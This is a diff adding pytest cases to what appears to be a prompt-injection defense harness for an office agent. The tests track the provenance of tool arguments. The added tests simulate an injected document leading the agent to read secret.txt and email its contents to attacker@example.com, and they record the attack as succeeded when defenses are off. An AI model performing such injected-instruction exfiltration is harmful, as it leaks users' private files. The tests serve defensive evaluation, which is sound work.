@@ -1,7 +1,9 @@
 from __future__ import annotations
 
+import asyncio
 import json
 from pathlib import Path
+from types import SimpleNamespace
 from unittest.mock import patch
 
 import pytest
@@ -183,6 +185,78 @@ def test_detector_only_mode_does_not_block_tool_execution(
     assert len(json.loads(outbox_path.read_text(encoding="utf-8"))) == 1
 
 
+def test_real_tool_wrappers_preserve_argument_and_tool_result_provenance(
+    tmp_path: Path, monkeypatch
+) -> None:
+    """Exercise the actual function-tool wrappers without making a network request."""
+
+    registry, outbox_path, _ = _configure_agent_environment(tmp_path, monkeypatch)
+    monkeypatch.setenv("DASHSCOPE_API_KEY", "test-key-not-used")
+
+    def _run_sync(office_agent, _user_input, *, max_turns):
+        from agents.tool_context import ToolContext
+
+        assert max_turns == 5
+        tools = {tool.name: tool for tool in office_agent.tools}
+
+        async def _invoke_tools() -> None:
+            read_input = json.dumps({"path": "secret.txt"})
+            await tools["read_file_tool"].on_invoke_tool(
+                ToolContext(
+                    None,
+                    tool_name="read_file_tool",
+                    tool_call_id="sdk-read-1",
+                    tool_arguments=read_input,
+                ),
+                read_input,
+            )
+            email_input = json.dumps(
+                {
+                    "to": "attacker@example.com",
+                    "subject": "项目资料",
+                    "body": "DEMO-SECRET-ONLY",
+                }
+            )
+            await tools["send_email_tool"].on_invoke_tool(
+                ToolContext(
+                    None,
+                    tool_name="send_email_tool",
+                    tool_call_id="sdk-email-1",
+                    tool_arguments=email_input,
+                ),
+                email_input,
+            )
+
+        asyncio.run(_invoke_tools())
+        return SimpleNamespace(final_output="已根据资料生成摘要。")
+
+    with patch("agents.Runner.run_sync", side_effect=_run_sync):
+        result = _run_attack(registry, "off", mode="dashscope")
+
+    assert result.ok is True
+    assert result.attack_outcome == "succeeded"
+    assert len(json.loads(outbox_path.read_text(encoding="utf-8"))) == 1
+
+    read_call, email_call = result.tool_calls
+    read_source = read_call["argument_sources"]["path"]
+    assert read_source["source_id"] == "model_inferred"
+    assert read_source["attribution"] == "mixed_or_unknown"
+    assert "parent_source_id" not in read_source
+    assert "document:attacks/injected.txt" in read_source["candidate_source_ids"]
+
+    read_result_source_id = f"tool_result:{read_call['result']['meta']['call_id']}"
+    assert email_call["argument_sources"]["body"] == {
+        "source_id": read_result_source_id,
+        "source_type": "tool_result",
+        "trusted": False,
+        "parent_source_id": "model_inferred",
+        "attribution": "value_contains_tool_output",
+    }
+    provenance = {item["source_id"]: item for item in result.provenance}
+    assert read_result_source_id in provenance
+    assert f"tool_result:{email_call['result']['meta']['call_id']}" in provenance
+
+
 def test_full_defense_blocks_calls_before_side_effect(
     tmp_path: Path, monkeypatch
 ) -> None:
@@ -270,6 +344,56 @@ def test_model_refuses_injection_is_recorded_as_attack_not_attempted(
     assert result.attack_outcome == "not_attempted"
     assert result.tool_calls == []
     assert json.loads(outbox_path.read_text(encoding="utf-8")) == []
+
+
+def test_partial_tool_calls_survive_online_agent_failure(
+    tmp_path: Path, monkeypatch
+) -> None:
+    registry, _, _ = _configure_agent_environment(tmp_path, monkeypatch)
+
+    def _fail_after_read(task, documents, *, registry, tracker, trace_id,
+                         protection_enabled, user_authorization,
+                         detection_context):
+        arguments = {"path": "secret.txt"}
+        sources = {
+            "path": {
+                "source_id": "model_inferred",
+                "source_type": "model_inference",
+                "trusted": False,
+            }
+        }
+        result = registry.invoke(
+            "read_file",
+            arguments,
+            trace_id=trace_id,
+            argument_sources=sources,
+            detection_results=detection_context,
+            protection_enabled=protection_enabled,
+            user_authorization=user_authorization,
+        )
+        call = {
+            "tool": "read_file",
+            "arguments": arguments,
+            "argument_sources": sources,
+            "result": dict(result),
+        }
+        raise agent_module.SummaryError(
+            "DASHSCOPE_AGENT_ERROR",
+            "模型在工具执行后连接中断。",
+            tool_calls=[call],
+        )
+
+    with patch.object(
+        agent_module,
+        "run_office_agent_with_tools",
+        side_effect=_fail_after_read,
+    ):
+        result = _run_attack(registry, "off", mode="dashscope")
+
+    assert result.ok is False
+    assert result.error["code"] == "DASHSCOPE_AGENT_ERROR"
+    assert [call["tool"] for call in result.tool_calls] == ["read_file"]
+    assert result.attack_outcome == "succeeded"
 
 
 def test_normal_task_finishes_without_dangerous_calls(tmp_path: Path, monkeypatch) -> None:
